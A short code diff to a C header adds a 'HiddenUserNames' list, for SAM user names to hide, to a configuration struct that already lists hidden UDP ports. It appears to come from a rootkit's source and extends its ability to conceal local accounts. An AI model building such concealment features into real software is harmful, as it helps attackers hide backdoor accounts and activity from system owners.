@@ -44,6 +44,10 @@ typedef struct _R77_CONFIG
 	/// A list of UDP ports to hide.
 	/// </summary>
 	PINTEGER_LIST HiddenUdpPorts;
+	/// <summary>
+	/// A list of SAM user names to hide.
+	/// </summary>
+	PSTRING_LIST HiddenUserNames;
 } R77_CONFIG, *PR77_CONFIG;
 
 /// <summary>
